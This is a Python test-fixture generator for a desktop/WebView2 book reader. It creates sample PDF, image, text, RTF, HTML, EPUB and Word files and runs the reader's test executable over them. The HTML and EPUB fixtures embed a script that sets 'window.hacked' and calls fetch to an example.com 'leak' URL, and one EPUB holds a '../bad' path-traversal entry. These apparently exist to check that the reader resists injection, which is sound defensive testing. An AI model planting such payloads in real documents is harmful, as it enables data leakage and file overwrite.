"""Offline fixtures for the production native/WebView2 reader; no email."""
from pathlib import Path
import io
import argparse
import os
import subprocess
import tempfile
import sys
import zipfile
from PIL import Image
from docx_fixture import create_docx_fixtures
from doc_fixture import create_doc_fixtures

parser = argparse.ArgumentParser(description='Visible reader tests; opt in and select only the scope needed.')
parser.add_argument('probe', nargs='?')
parser.add_argument('--interactive', action='store_true')
parser.add_argument('--format', choices=['doc', 'docx', 'all'], default='all')
args = parser.parse_args()
if not args.interactive and os.environ.get('BOOKS_RUN_INTERACTIVE_TESTS') != '1':
    print('SKIP: visible reader tests. Use scripts/test-ui.ps1 -Test reader -ReaderFormat docx (or all).')
    sys.exit(77)
os.environ['BOOKS_RUN_INTERACTIVE_TESTS'] = '1'
root = Path(__file__).resolve().parents[1]
with tempfile.TemporaryDirectory(prefix='books-reader-') as folder:
    folder = Path(folder)
    images = [Image.new('RGB', (400, 600), color) for color in ['red', 'green', 'blue']]
    images[0].save(folder / 'three.pdf', save_all=True, append_images=images[1:])
    images[0].save(folder / 'single.pdf')
    for extension in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
        images[0].save(folder / ('picture.' + extension))
    (folder / 'read.txt').write_text('Unicode: café 日本語\n' + ''.join(f'Line {i}: plain text reading.\n' for i in range(400)), encoding='utf-8')
    (folder / 'utf16.txt').write_text('Unicode: café 日本語\nSecond line', encoding='utf-16')
    (folder / 'legacy.txt').write_bytes('café\rSecond line'.encode('cp1252'))
    (folder / 'binary.txt').write_bytes(b'text\x00binary')
    (folder / 'empty.txt').write_bytes(b'')
    (folder / 'oversized.txt').write_bytes(b'x' * (8 * 1024 * 1024 + 1))
    with (folder / 'large.txt').open('wb') as large:
        for _ in range(64):
            large.write(b'X' * (1024 * 1024))
    (folder / 'late-legacy.txt').write_bytes(b'A' * 32768 + b'caf\xe9')
    (folder / 'read.rtf').write_text(r"{\rtf1\ansi\ansicpg1252 {\fonttbl{\f0 Segoe UI;}}\f0\fs28\b Formatted RTF\b0\par " + (r"Unicode: caf\'e9 \u26085?\u26412?\u35486?\par A readable paragraph.\par " * 500) + '}', encoding='ascii')
    (folder / 'bad.rtf').write_text('not an RTF document', encoding='ascii')
    html = '<!doctype html><meta charset="utf-8"><style>body{font:18px sans-serif;margin:24px}h1{color:rgb(0,128,128)}</style><h1>Formatted HTML</h1><script>window.hacked=true;fetch("https://example.com/leak")</script><img src="https://example.com/external.png"><link rel="stylesheet" href="companion.css"><p>Unicode: caf&#233; &#26085;&#26412;&#35486; &amp; text</p>' + '<p>Readable paragraph.</p>' * 500
    for extension in ['html', 'htm']:
        (folder / ('read.' + extension)).write_text(html, encoding='utf-8')
    (folder / 'companion.css').write_text('body{color:red}', encoding='ascii')
    picture = io.BytesIO()
    Image.new('RGB', (20, 20), 'teal').save(picture, format='PNG')
    (folder / 'image.rtf').write_text(r'{\rtf1\ansi\fs28 Embedded picture\par {\pict\pngblip\picw20\pich20\picwgoal2000\pichgoal2000 ' + picture.getvalue().hex() + '}}', encoding='ascii')
    (folder / 'embedded.html').write_text('<meta charset="utf-8"><h1>Embedded picture</h1><img src="data:image/png;base64,' + __import__('base64').b64encode(picture.getvalue()).decode('ascii') + '">', encoding='utf-8')
    for encoding in ['utf-8-sig', 'utf-16']:
        (folder / (encoding + '.txt')).write_text(('A' * 32765 + '\U0001f4d6\r\n\u65e5') * 3, encoding=encoding, newline='')
    container = '<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OPS/book.opf" media-type="application/oebps-package+xml"/></rootfiles></container>'
    package = '''<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">test</dc:identifier><dc:title>Reader test</dc:title><dc:language>en</dc:language></metadata><manifest><item id="one" href="first%20chapter.xhtml" media-type="application/xhtml+xml"/><item id="two" href="second.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="one"/><itemref idref="two"/></spine></package>'''
    with zipfile.ZipFile(folder / 'book.epub', 'w', zipfile.ZIP_DEFLATED) as archive:
        archive.writestr('META-INF/container.xml', container)
        archive.writestr('OPS/book.opf', package)
        archive.writestr('OPS/first chapter.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>First</title><link rel="stylesheet" href="style.css"/></head><body><h1>First chapter</h1><img src="picture.png"/><script>window.hacked=true;fetch("https://example.com/leak")</script><p>' + ('Readable text. ' * 1000) + '</p></body></html>')
        archive.writestr('OPS/second.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Second</title></head><body><h1>Second chapter</h1></body></html>')
        archive.writestr('OPS/style.css', 'h1 { color: rgb(12,34,56); }')
        archive.writestr('OPS/picture.png', picture.getvalue())
    for name, entry in [('traversal', '../bad'), ('encrypted', 'META-INF/encryption.xml')]:
        with zipfile.ZipFile(folder / (name + '.epub'), 'w') as archive:
            archive.writestr(entry, 'bad')
    for name, first in [
        ('same-cover', '<img src="picture.png"/>'),
        ('same-svg-cover', '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"><image href="picture.png" width="200" height="200"/></svg>'),
        ('different-first', '<img src="different.png"/>'),
        ('cover-with-text', '<img src="picture.png"/><p>Do not skip this title page</p>')]:
        with zipfile.ZipFile(folder / (name + '.epub'), 'w') as archive:
            archive.writestr('META-INF/container.xml', container)
            archive.writestr('OPS/book.opf', package.replace('</manifest>', '<item id="cover" href="picture.png" media-type="image/png" properties="cover-image"/></manifest>'))
            archive.writestr('OPS/first chapter.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Opening</title></head><body>' + first + '</body></html>')
            archive.writestr('OPS/second.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Next</title></head><body>First actual reading page</body></html>')
            archive.writestr('OPS/picture.png', picture.getvalue())
            archive.writestr('OPS/different.png', picture.getvalue())
    with zipfile.ZipFile(folder / 'fixed.epub', 'w') as archive:
        archive.writestr('META-INF/container.xml', container)
        archive.writestr('OPS/book.opf', package.replace('</metadata>', '<meta property="rendition:layout">pre-paginated</meta></metadata>'))
        for chapter in ['first chapter.xhtml', 'second.xhtml']:
            archive.writestr('OPS/' + chapter, '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Fixed</title><meta name="viewport" content="width=400,height=600"/></head><body><h1>Fixed layout</h1></body></html>')
    create_docx_fixtures(folder, picture.getvalue())
    if args.format in ("doc", "all"):
        create_doc_fixtures(folder, root / "build/doc-fixture.doc")
    probe = Path(args.probe) if args.probe else root / 'build/Release/reader_tests.exe'
    subprocess.run([str(probe), str(folder)] + (["--" + args.format + "-only"] if args.format != "all" else []), check=True, timeout=160)
